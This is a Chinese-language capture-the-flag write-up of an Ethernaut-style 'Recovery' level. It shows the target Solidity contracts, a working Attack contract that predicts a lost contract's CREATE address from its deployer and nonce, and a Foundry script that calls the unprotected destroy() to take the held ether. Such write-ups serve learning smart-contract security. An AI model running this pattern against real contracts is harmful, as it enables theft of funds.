# Recovery create地址预测

# 源码

目标:

合约创建者构建了一个非常简单的代币工厂合约.任何人都可以轻松创建新代币。在部署了一个代币合约后，创建者发送了0.001ether以获得更多代币.后边他们丢失了合约地址。如果您能从丢失的的合约地址中找回(或移除)这0.001ether，则顺利通过此关

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//0x0791d9BDA37a260530722bfC6FAafFdc30f82180

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}

```

create预测地址,把这个地址算出来,然后`destroy()`把里面钱拿走就行

# 攻击合约

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {SimpleToken, Recovery} from "./Recovery.sol";

contract Attack {
    SimpleToken public simpletoken;
    address public predictaddr;

    constructor(address addr) {
        simpletoken = SimpleToken(payable(addr));
    }

    function xuan(address addr) public returns (address) {
        predictaddr = address(
            uint160(
                uint(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            addr,
                            bytes1(0x01)//nouce==1才这么写
                        )
                    )
                )
            )
        );//create地址预测公式
        return predictaddr;
    }

    function attack() external {
        simpletoken = SimpleToken(payable(predictaddr));
        simpletoken.destroy(payable(msg.sender));
    }
}

```

# 脚本

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Attack} from "../src/Attack.sol";
import {Script} from "forge-std/Script.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Attack attack = new Attack(0x0791d9BDA37a260530722bfC6FAafFdc30f82180);
        attack.xuan(0x0791d9BDA37a260530722bfC6FAafFdc30f82180);
        attack.attack();
        vm.stopBroadcast();
    }
}

```


> 更新: 2025-07-21 16:42:48  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/otg5tmveofsx7bbo>